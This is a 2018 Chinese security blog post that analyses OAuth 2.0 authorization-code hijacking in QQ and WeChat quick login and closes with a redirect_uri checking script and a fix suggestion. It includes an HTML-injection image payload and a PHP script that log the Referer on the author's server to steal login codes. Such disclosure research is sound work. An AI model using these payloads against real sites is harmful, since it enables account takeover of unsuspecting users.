<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>OAuth2.0认证缺陷-第三方帐号快捷登录授权劫持漏洞 · Chen's Blog</title> <meta name="description" content="什么是OAuth2.0？"> <meta name="keywords" content="什么是OAuth2.0？"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2018-02-12/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/links" target="_blank">Links</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">OAuth2.0认证缺陷-第三方帐号快捷登录授权劫持漏洞</h1> <time class="code">February 12, 2018</time> </div> <div class="divider"></div> <h1 id="什么是oauth20"><strong>什么是OAuth2.0？</strong></h1> <blockquote> <p>OAuth2.0是OAuth协议的下一版本，但不向后兼容OAuth 1.0即完全废止了OAuth1.0。 OAuth 2.0关注客户端开发者的简易性。要么通过组织在资源拥有者和HTTP服务商之间的被批准的交互动作代表用户，要么允许第三方应用代表用户获得访问的权限。同时为Web应用，桌面应用和手机，和起居室设备提供专门的认证流程。2012年10月，OAuth 2.0协议正式发布为RFC 6749 。</p> </blockquote> <p><strong>RFC 6749 : https://tools.ietf.org/html/rfc6749</strong></p> <h1 id="qq-oauth20-流程分析攻击"><strong>QQ OAuth2.0 流程分析&amp;攻击</strong></h1> <p>国内的很多厂商使用了OAuth2.0的认证方式，这里以QQ为例。</p> <p><strong>QQ互联 : https://connect.qq.com/intro/login</strong></p> <p>相信大家在很多网站上都见过如下的登陆界面：</p> <p><img src="/images/2018-02-12/0x00.jpg" alt="img" /></p> <p>可以看见除了厂商本身网站的账号以外还有QQ跟微信这两个快捷登陆，首先以QQ的快捷登陆为例子：</p> <p>点击QQ图标进入登陆的链接 -&gt; <strong>https://graph.qq.com/oauth2.0/show?which=Login&amp;display=pc&amp;response_type=code&amp;client_id=100273020&amp;redirect_uri=http://a.com/?view=null&amp;uuid=65392bc3fc724fca8dcba23558f67ec8</strong></p> <p><img src="/images/2018-02-12/0x01.jpg" alt="img" /></p> <p>这里因为我的QQ是在电脑上已经登陆了，所以我可以直接进行登陆，这时候进行抓包截取整个流程，</p> <h1 id="关键流程分析"><strong>关键流程分析</strong></h1> <p><strong>Request 1：</strong></p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/oauth2.0/authorize</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">graph.qq.com</span>
</code></pre></div></div> <p><strong>1 Response：</strong></p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">tws</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 09 Feb 2018 11:50:42 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=50</span>
<span class="na">Content-Encoding</span><span class="p">:</span> <span class="s">gzip</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">http:/a.com/?uuid=65392bc3fc724fca8dcba23558f67ec8&amp;code=120ED71CAECB11BAD538820E12B54664</span>
</code></pre></div></div> <p><strong>Request 2：</strong>(这个请求表示根据参数<strong>code</strong>的值进行个人用户凭证生成)</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/?uuid=65392bc3fc724fca8dcba23558f67ec8&amp;code=120ED71CAECB11BAD538820E12B54664</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">a.com</span>
</code></pre></div></div> <p><strong>2 Response：</strong>（setcookie返回用户凭证）</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">用户凭证</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">https://www.a.com/</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div> <p>这时候我们就可以注意到问题了，请求1产生了一个链接，其就是QQ登陆的地址中的参数<strong>redirect_uri</strong>附带上<strong>参数code的值</strong>，而这个链接是生成用户凭证的，所以链接中的<strong>参数code</strong>也是至关重要的，看到这里我的攻击思路已经产生了：</p> <p>假设QQ登陆的地址中的参数<strong>redirect_uri</strong>的值可以为我的网站，那么只要用户A点击我就可以根据网站日志访问记录获取参数<strong>code</strong>的值再根据请求2获取用户A在 http://a.com 的账号权限。</p> <p>理想很好，现实残酷：</p> <p><img src="/images/2018-02-12/0x02.jpg" alt="img" /></p> <p>这里QQ做了限制，我不需要去分析QQ关联的全部流程就能知道这里的参数client_id，其实就是 http://a.com 的QQ互联的服务id， http://graph.qq.com 根据client_id获取 http://a.com 的设置允许的参数<strong>redirect_uri</strong>的值再跟你输入的参数<strong>redirect_uri</strong>的值进行比较。</p> <p>这时候我只需要对参数<strong>redirect_uri</strong>进行Fuzz就能知道哪些范围是允许的：</p> <p><img src="/images/2018-02-12/0x03.jpg" alt="img" /></p> <p>http://a.com 的二级子域名可以为参数<strong>redirect_uri</strong>的值，目前我需要解决的就是如何根据 http://a.com 的二级子域名获取到code的值：</p> <h1 id="1我有一个html注入漏洞"><strong>1.我有一个HTML注入漏洞</strong></h1> <p>漏洞地址：<code class="language-plaintext highlighter-rouge">http://1.a.com/?xss=%3Cimg%20src="http://www.evilchen.cn/getref.php"%3E</code></p> <p>getref.php的内容为如下PHP代码：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
file_put_contents("ref.txt", $_SERVER['HTTP_REFERER']);
?&gt;
</code></pre></div></div> <p>将漏洞地址作为参数<strong>redirect_uri</strong>的值，然后诱导用户A点击登陆，这时候跳转的链接就变成了：</p> <blockquote> <p>http://1.a.com/?xss=%3Cimg%20src=”http://www.evilchen.cn/getref.php”%3E&amp;code=120ED71CAECB11BAD538820E12B54664</p> </blockquote> <p>跳转之后这个链接会做为HTTP Referer的值再请求[http://www.evilchen.cn/getref.php]，那么我的服务器就会接收到code的值，再根据Request 2的值填入，我就可以获取用户A在a.com的账号权限了</p> <h1 id="2我能在其他地方引用外部资源"><strong>2.我能在其他地方引用外部资源</strong></h1> <p><img src="/images/2018-02-12/0x04.jpg" alt="img" /></p> <p>很多厂商都会有社区、论坛等功能，大部分会使用Discuz程序来做，而Discuz确实可以引用外部资源~</p> <p>这里我使用的图片地址还是 http://www.evilchen.cn/getref.php 然后进行帖子回复。</p> <p>帖子地址为 http://bbs.a.com/thread-123-1-1.html 将帖子地址作为参数<strong>redirect_uri</strong>的值，然后诱导用户A点击登陆，这时候跳转的链接就变成了：</p> <p>http://bbs.a.com/thread-123-1-1.html?code=120ED71CAECB11BAD538820E12B54664</p> <p>跳转之后这个链接会做为HTTP Referer的值再请求 http://www.evilchen.cn/getref.php 那么我的服务器就会接收到code的值，再根据Request 2的值填入，我就可以获取用户A在a.com的账号权限了：</p> <p><img src="/images/2018-02-12/0x05.jpg" alt="img" /></p> <h1 id="攻击流程"><strong>攻击流程</strong></h1> <p>1.我点击 http://a.com 的QQ登录，获取QQ快捷登录链接，替换redirect_uri的值为如上两个问题的地址然后发送给受害者2.受害者点击QQ头像登录，会跳转到redirect_uri的值(链接)，并且携带上code的值</p> <p>3.受害者浏览器以跳转后的链接作为referer头请求外链图片(php)</p> <p>4.攻击者获取referer的值，构建B地址，并且进入链接(注意 攻击者要在未登录情况下)</p> <h1 id="微信快捷登陆流程"><strong>微信快捷登陆流程</strong></h1> <p>开发平台：https://open.weixin.qq.com/</p> <p>http://a.com的地址如下：</p> <p>https://open.weixin.qq.com/connect/qrconnect?appid=&amp;redirect_uri=http://a.com/wx?callback=null</p> <p>微信扫描后会跳转到：</p> <p>http://a.com/weixin?callback=null&amp;code=021n2XAB00C4mg2FvKyB0W7QAB0n2XAF</p> <p>而只要利用QQ快捷登陆的方法我们一样可以获取到code的值</p> <h1 id="攻击流程-1"><strong>攻击流程</strong></h1> <p>1.我点击http://a.com的QQ登录，获取微信快捷登录链接，替换redirect_uri的值为如上两个问题的地址然后发送给受害者 2.受害者点开微信扫描，会跳转到redirect_uri的值(链接)，并且携带上code的值</p> <p>3.受害者浏览器以跳转后的链接作为referer头请求外链图片(php)</p> <p>4.攻击者获取referer的值，构建B地址，并且进入链接(注意 攻击者要在未登录情况下)</p> <h1 id="风险检测"><strong>风险检测</strong></h1> <p>我简单的写了个poc，仅仅做风险检测，具体危害可以自行检查~~（<strong>PS：支持微信跟QQ的快捷登陆风险检测</strong>）</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># -*- coding:utf-8 -*-
# Name: QQ and WeChat OAuth2.0 PoC
# Auther: MSTLab(EvilChen)
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">urlparse</span><span class="p">,</span><span class="n">urllib</span>

<span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
	<span class="n">url</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">tempUrl</span> <span class="o">=</span> <span class="n">getValue</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="n">tempDomain</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">tempUrl</span><span class="p">).</span><span class="n">netloc</span>
	<span class="n">domainA</span> <span class="o">=</span> <span class="n">tempDomain</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
	<span class="n">domainB</span> <span class="o">=</span> <span class="n">tempDomain</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">domainA</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s">"mstlab"</span><span class="p">)</span>
	<span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">tempUrl</span><span class="p">,</span><span class="s">"http://"</span> <span class="o">+</span> <span class="n">domainB</span><span class="p">)</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
	<span class="c1"># print url
</span>	<span class="k">if</span> <span class="p">(</span><span class="s">"redirect uri is illegal"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="s">"&gt;redirect_uri"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">):</span>
	    <span class="k">print</span> <span class="s">"[*] This Website is safe."</span>
	<span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="s">"[*] This Website is vulnerable!"</span>

<span class="k">def</span> <span class="nf">getValue</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">query</span>
    <span class="n">resUrl</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">([(</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">urlparse</span><span class="p">.</span><span class="n">parse_qs</span><span class="p">(</span><span class="n">query</span><span class="p">).</span><span class="n">items</span><span class="p">()])[</span><span class="s">'redirect_uri'</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">resUrl</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">url</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"URL: "</span><span class="p">)</span>
	<span class="n">scan</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</code></pre></div></div> <p>poc的使用方法很简单，只需要复制QQ和微信快捷登陆的链接：</p> <p><img src="/images/2018-02-12/0x06.jpg" alt="img" /></p> <p>经过我们实验室的排查发现存在风险的厂商如下：</p> <p><img src="/images/2018-02-12/0x07.jpg" alt="img" /></p> <p>等国内知名厂商近百家都存在此危害。</p> <h1 id="修复建议"><strong>修复建议</strong></h1> <p>redirect_uri的值做限制</p> <h1 id="结尾"><strong>结尾</strong></h1> <p>文章参考：</p> <p>http://wooyun.jozxing.cc/search?keywords=OAuth&amp;content_search_by=by_bugs</p> <p>http://www.cnvd.org.cn/flaw/show/CNVD-2014-02785</p> <p>http://www.cnvd.org.cn/flaw/show/CNVD-2018-01622</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2018-03-22/1" title="NEXT: 读取型CSRF-需要交互的内容劫持">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2017-12-20/1" title="PREV: 鸡肋点搭配ClickJacking攻击-获取管理员权限">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
